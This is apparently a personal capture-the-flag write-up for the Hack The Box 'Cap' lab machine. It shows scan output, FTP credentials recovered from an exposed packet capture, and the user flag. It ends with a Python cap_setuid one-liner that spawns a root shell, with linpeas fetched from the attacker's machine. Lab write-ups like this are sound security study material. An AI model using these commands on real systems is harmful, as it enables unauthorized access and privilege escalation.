# IP: 10.10.10.245
### [Challenge](https://app.hackthebox.com/machines/Cap)

- # ENUM
	- nmap (`nmap -sV -A -p- -T4 10.10.10.245`)
		- ```PORT   STATE SERVICE VERSION
			21/tcp open  ftp     vsftpd 3.0.3
			22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
			| ssh-hostkey: 
			|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)s
			|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
			|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
			80/tcp open  http    Gunicorn
			|_http-server-header: gunicorn
			|_http-title: Security Dashboard
			Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_keranel```
	- dirbuster:
		- /ip
		- /netstat
		- /static/js/.......
		- /data/1


- # EXPLOITATION
	- There's a directory (/data) that stores all the user's scans
	- Sus scan: 0.pcap
		- It contains FTP credentials
			- username: `nathan`
			- password: `Buck3tH4TF0RM3!`
	- Connect via FTP (`ftp -p 10.10.10.245 21`)
	- `get user.txt`
		- `7f9fad818ecfc0bd8105acd7fd18e46b`
	- The same credentials work with SSH! (`ssh nathan@10.10.10.245`)

- # PRIVILEGE ESCALATION
	- Run linpeas.sh (host python server -> `wget linpeas.sh` in victim's machine /tmp) 
		- /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
	- python3.8 has capabilities! Let's see on GTFOBins
		- `python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'`
	- Let's execute this command on the terminal
		- We're root now!

